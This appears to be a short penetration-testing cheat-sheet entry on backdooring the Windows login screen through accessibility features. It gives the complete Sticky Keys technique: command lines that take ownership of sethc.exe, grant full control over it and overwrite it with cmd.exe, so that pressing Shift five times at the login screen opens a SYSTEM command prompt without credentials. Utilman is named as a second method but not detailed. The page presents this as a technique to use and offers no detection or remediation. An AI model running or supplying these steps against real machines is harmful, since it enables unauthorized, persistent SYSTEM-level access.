#### How can we Backdoor Login Screen/RDP?
With physical or RDP access, you can backdoor the **Windows login screen** to get a **terminal without valid credentials** by exploiting **accessibility features**. 

Two common methods are:
- `Sticky Keys`
- `Utilman`

#### Sticky Keys Backdoor
You can exploit the **Sticky Keys accessibility shortcut** to get a **SYSTEM-level command prompt** from the Windows **login screen, without logging in**. 

Pressing `shift` 5 times triggers `sethc.exe` (Sticky Keys binary) even from the **login screen**. 

We can backdoor the login screen by replacing `C:\Windows\System32\sethc.exe` with a copy of `cmd.exe` to spawn a console using the sticky keys shortcut, even from the logging screen.

#### 1. Take Ownership of `sethc.exe` (Sticky Keys binary)
```cmd
takeown /f C:\Windows\System32\sethc.exe
```

#### 2. Grant yourself Full Control
```cmd
icacls C:\Windows\System32\sethc.exe /grant Administrator:F
```

#### 3. Replace `sethc.exe` with `cmd.exe`
```cmd
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

4. Lock your session from the Start menu or reboot the machine.
5. At the login screen, press `shift` 5 times to access a terminal with SYSTEM privilege directly from the login screen